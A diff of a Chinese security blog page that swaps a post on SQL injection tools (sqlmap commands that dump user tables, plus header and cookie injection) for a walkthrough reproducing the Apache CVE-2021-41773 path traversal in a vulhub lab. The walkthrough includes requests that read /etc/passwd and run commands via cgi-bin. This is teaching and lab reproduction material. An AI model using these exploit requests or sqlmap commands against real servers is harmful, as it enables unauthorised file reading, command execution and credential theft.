@@ -4,8 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sql注入工具的使用, Broken-year">
-    <meta name="description" content="SQL注入工具的使用网站的一些组合windows+iis（网站服务器）+asp&amp;#x2F;aspx(asp.net)+access&amp;#x2F;mssql【企业内部使用概率大】【打下来是普通用户权限】windows+apache+php+my">
+    <meta name="keywords" content="Apache HTTP Server路径穿越漏洞(CVE-2021-41773), Broken-year">
+    <meta name="description" content="Apache HTTP Server路径穿越漏洞简述
+Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sql注入工具的使用 | Broken-year</title>
+    <title>Apache HTTP Server路径穿越漏洞(CVE-2021-41773) | Broken-year</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -251,7 +252,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sql注入工具的使用</h1>
+                    <h1 class="description center-align post-title">Apache HTTP Server路径穿越漏洞(CVE-2021-41773)</h1>
                 </div>
             </div>
         </div>
@@ -367,24 +368,32 @@
                     
                     <div class="article-tag">
                         
+                            <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                                <span class="chip bg-color">环境搭建</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
+                            </a>
+                        
                             <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
                                 <span class="chip bg-color">网络安全</span>
                             </a>
                         
-                            <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
-                                <span class="chip bg-color">工具使用</span>
+                            <a href="/tags/Apache/">
+                                <span class="chip bg-color">Apache</span>
                             </a>
                         
-                            <a href="/tags/web/">
-                                <span class="chip bg-color">web</span>
+                            <a href="/tags/httpd/">
+                                <span class="chip bg-color">httpd</span>
                             </a>
                         
-                            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">sql注入</span>
+                            <a href="/tags/vulhub/">
+                                <span class="chip bg-color">vulhub</span>
                             </a>
                         
-                            <a href="/tags/sql/">
-                                <span class="chip bg-color">sql</span>
+                            <a href="/tags/CVE/">
+                                <span class="chip bg-color">CVE</span>
                             </a>
                         
                     </div>
@@ -395,8 +404,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
-                                网络安全
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
                             </a>
                         
                     </div>
@@ -408,7 +417,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-23
+                    2022-05-10
                 </div>
                 
 
@@ -417,7 +426,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    704
+                    381
                 </div>
                 
 
@@ -439,71 +448,47 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="SQL注入工具的使用"><a href="#SQL注入工具的使用" class="headerlink" title="SQL注入工具的使用"></a>SQL注入工具的使用</h1><h2 id="网站的一些组合"><a href="#网站的一些组合" class="headerlink" title="网站的一些组合"></a>网站的一些组合</h2><p>windows+iis（网站服务器）+asp&#x2F;aspx(asp.net)+access&#x2F;mssql【企业内部使用概率大】【打下来是普通用户权限】<br>windows+apache+php+mysql&#x3D; wamp（一般使用软件进行集成化搭建)【老版本PHPadmin有漏洞】【打下来是普通用户权限】</p>
-<p>linux+apache&#x2F;nginx+php+mysql &#x3D; lamp&#x2F;lnmp（有可能使用宝塔或者其他面板搭建）【使用较多】【打下来是网站管理的权限】</p>
-<p>linux+tomcat+java(jsp)+oracle&#x2F;mysql 【打下来是root权限】</p>
-<p>linux+nginx+python(django&#x2F;flask)+mysql【新】</p>
-<h2 id="pangolin（穿山甲）"><a href="#pangolin（穿山甲）" class="headerlink" title="pangolin（穿山甲）"></a>pangolin（穿山甲）</h2><blockquote>
-<p>穿山甲作为老牌的SQL注入工具，在注入方面支持多种提交方式，是在手动发现注入点之后，一款比较好用的注入工具。</p>
+                <h1 id="Apache-HTTP-Server路径穿越"><a href="#Apache-HTTP-Server路径穿越" class="headerlink" title="Apache HTTP Server路径穿越"></a>Apache HTTP Server路径穿越</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote>
+<p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
+<ul>
+<li>版本等于2.4.49</li>
+<li>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</li>
+</ul>
+<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
 </blockquote>
-<p><img src="/2022/03/23/sql-gjsy/image-20220323111431072.png" alt="image-20220323111431072"></p>
-<blockquote>
-<p>查看基本信息</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/CVE-2021-41337
+docker-compose up -d
+</code></pre>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先访问一个真实存在的目录，比如<code>/icons/</code></p>
+<p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161248403.png" alt="image-20220510161248403"></p>
+<p>然后抓包，查看<code>/etc/passwd</code></p>
+<pre class=" language-bash"><code class="language-bash">GET /icons/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd HTTP/1.1
+</code></pre>
+<p>如果这样的话他会报错</p>
+<p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161347687.png" alt="image-20220510161347687"></p>
+<p>因此需要url编码</p>
+<pre class=" language-bash"><code class="language-bash">GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+</code></pre>
+<p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161904932.png" alt="image-20220510161904932"></p>
+<p>出来了！</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><blockquote>
+<p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令</p>
 </blockquote>
-<p><img src="/2022/03/23/sql-gjsy/image-20220323111809951.png" alt="image-20220323111809951"></p>
-<blockquote>
-<p>查看表和数据</p>
-</blockquote>
-<p><img src="/2022/03/23/sql-gjsy/image-20220323111935479.png" alt="image-20220323111935479"></p>
-<h2 id="havij（萝卜头）"><a href="#havij（萝卜头）" class="headerlink" title="havij（萝卜头）"></a>havij（萝卜头）</h2><p><img src="/2022/03/23/sql-gjsy/image-20220323115533965.png" alt="image-20220323115533965"></p>
-<h2 id="sqlmap（sql注入神器）"><a href="#sqlmap（sql注入神器）" class="headerlink" title="sqlmap（sql注入神器）"></a>sqlmap（sql注入神器）</h2><h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><pre class=" language-Linux"><code class="language-Linux">sqlmap -u [目标url] --dbs  //获取目标网站数据库库名
-sqlmap -u [目标url] -D security --tables //获取库里的表
-sqlmap -u [目标url] -D security -T users columns //发现id，username，password
-sqlmap -u [目标url] -D security -T users -C username,password --dump //找到数据
+<p>修改参数</p>
+<pre class=" language-bash"><code class="language-bash">GET /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1
+Host: 192.168.3.151:8080
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 6.1<span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:52.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 7
 
-完整版命令
-sqlmap -u [目标url] dbs batch threads 10 technique U
-使用sqlmap10线程，忽略错误，使用union select注入网站
+<span class="token keyword">echo</span><span class="token punctuation">;</span><span class="token function">id</span>
 </code></pre>
-<h3 id="报错注入（error-based）"><a href="#报错注入（error-based）" class="headerlink" title="报错注入（error based）"></a>报错注入（error based）</h3><blockquote>
-<p>无法发现报错位，但是数据库错了会显示出来</p>
-</blockquote>
-<pre class=" language-Linux"><code class="language-Linux">sqlmap -u http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1 --current-db --batch --threads 10 --technique E
-</code></pre>
-<h3 id="布尔型注入（booled-based）"><a href="#布尔型注入（booled-based）" class="headerlink" title="布尔型注入（booled based）"></a>布尔型注入（booled based）</h3><blockquote>
-<p>无法发现报错位，数据库被破坏也无法爆出来，但是界面上会出现有和没有东西两种情况</p>
-</blockquote>
-<pre class=" language-Linux"><code class="language-Linux">sqlmap -u http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1 --current-db --batch --threads 10 --technique B
-</code></pre>
-<h3 id="时间盲注（time-based）"><a href="#时间盲注（time-based）" class="headerlink" title="时间盲注（time based）"></a>时间盲注（time based）</h3><blockquote>
-<p>无法发现报错位，数据库被破坏也无法爆出来，界面上也没有出现或者消失东西的现象</p>
-</blockquote>
-<pre class=" language-Linux"><code class="language-Linux">sqlmap -u http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1 --current-db --batch --threads 10 --technique T
-</code></pre>
-<h3 id="POST方面注入"><a href="#POST方面注入" class="headerlink" title="POST方面注入"></a>POST方面注入</h3><pre class=" language-php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'unmae'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-select username<span class="token punctuation">,</span>password from users where username<span class="token operator">=</span><span class="token string">'$uname'</span> <span class="token keyword">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
-</code></pre>
-<pre class=" language-Linux"><code class="language-Linux">sqlmap -u http://sqlilabs.njhack.xyz/Less-11/ --data "uname=admin*&passwd=admin&submit=Submit" --current-db --batch --threads 10 --technique E
-
---data 后面跟的是post的数据【用purbsuite抓包得到】
-*号标哪，就是让sqlmap打哪
-</code></pre>
-<p><strong>有的网站可能会搜集用户的浏览器信息：</strong></p>
-<h3 id="请求头注入"><a href="#请求头注入" class="headerlink" title="请求头注入"></a>请求头注入</h3><pre class=" language-Linux"><code class="language-Linux">ip地址，user-agent（浏览器信息）,referer（来路）,cookie
-
-sqlmap -u http://sqlilabs.njhack.xyz/Less-18/ --user-agent="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0*" --level 4 --dbs --threads 10 --batch --technique E
-
-# 在使用请求头注入的时候，--level必须大于3
-
-# *号标哪，就是让sqlmap打哪
-
-
-sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=dab97c3dd6a54c5ca485d3e880af5ce271605180690" --level 4 --dbs --threads 10 --batch --technique E
-
-# cookie=？【用purbsuite抓包得到】
-# *号标哪，就是让sqlmap打哪
-</code></pre>
+<p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510165306353.png" alt="image-20220510165306353"></p>
+<p>成功！</p>
 
                 
             </div>
@@ -530,7 +515,7 @@ sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/03/23/sql-gjsy/">http://Broken-year.github.io/2022/03/23/sql-gjsy/</a>
+                    <a href="http://Broken-year.github.io/2022/05/10/Apache-HTTP-Path-traversal/">http://Broken-year.github.io/2022/05/10/Apache-HTTP-Path-traversal/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -568,24 +553,32 @@ sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=
                     
                         <div class="article-tag">
                             
+                                <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                                    <span class="chip bg-color">环境搭建</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
+                                </a>
+                            
                                 <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
                                     <span class="chip bg-color">网络安全</span>
                                 </a>
                             
-                                <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
-                                    <span class="chip bg-color">工具使用</span>
+                                <a href="/tags/Apache/">
+                                    <span class="chip bg-color">Apache</span>
                                 </a>
                             
-                                <a href="/tags/web/">
-                                    <span class="chip bg-color">web</span>
+                                <a href="/tags/httpd/">
+                                    <span class="chip bg-color">httpd</span>
                                 </a>
                             
-                                <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">sql注入</span>
+                                <a href="/tags/vulhub/">
+                                    <span class="chip bg-color">vulhub</span>
                                 </a>
                             
-                                <a href="/tags/sql/">
-                                    <span class="chip bg-color">sql</span>
+                                <a href="/tags/CVE/">
+                                    <span class="chip bg-color">CVE</span>
                                 </a>
                             
                         </div>
@@ -759,17 +752,18 @@ sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/23/web-vulnerability/">
+                <a href="/2022/05/10/Apache-HTTP-Path-traversal/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="web漏洞介绍">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Apache HTTP Server路径穿越漏洞(CVE-2021-41773)">
                         
-                        <span class="card-title">web漏洞介绍</span>
+                        <span class="card-title">Apache HTTP Server路径穿越漏洞(CVE-2021-41773)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -779,34 +773,51 @@ sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-23
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
-                                    网络安全
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                        <span class="chip bg-color">环境搭建</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
                     
                     <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
                         <span class="chip bg-color">网络安全</span>
                     </a>
                     
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
+                    <a href="/tags/Apache/">
+                        <span class="chip bg-color">Apache</span>
                     </a>
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/httpd/">
+                        <span class="chip bg-color">httpd</span>
+                    </a>
+                    
+                    <a href="/tags/vulhub/">
+                        <span class="chip bg-color">vulhub</span>
+                    </a>
+                    
+                    <a href="/tags/CVE/">
+                        <span class="chip bg-color">CVE</span>
                     </a>
                     
                 </div>
@@ -820,13 +831,13 @@ sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/22/php-sql/">
+                <a href="/2022/05/10/Apache-HTTP-mod-proxy/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="php和数据库">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Apache HTTP mod_proxy SSRF漏洞(CVE-2021-40438)">
                         
-                        <span class="card-title">php和数据库</span>
+                        <span class="card-title">Apache HTTP mod_proxy SSRF漏洞(CVE-2021-40438)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -837,14 +848,14 @@ sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/PHP/" class="post-category">
-                                    PHP
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
@@ -854,16 +865,32 @@ sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/PHP/">
-                        <span class="chip bg-color">PHP</span>
+                    <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                        <span class="chip bg-color">环境搭建</span>
                     </a>
                     
-                    <a href="/tags/mysql/">
-                        <span class="chip bg-color">mysql</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
-                    <a href="/tags/%E7%BC%96%E7%A8%8B/">
-                        <span class="chip bg-color">编程</span>
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                    <a href="/tags/Apache/">
+                        <span class="chip bg-color">Apache</span>
+                    </a>
+                    
+                    <a href="/tags/httpd/">
+                        <span class="chip bg-color">httpd</span>
+                    </a>
+                    
+                    <a href="/tags/vulhub/">
+                        <span class="chip bg-color">vulhub</span>
+                    </a>
+                    
+                    <a href="/tags/CVE/">
+                        <span class="chip bg-color">CVE</span>
                     </a>
                     
                 </div>
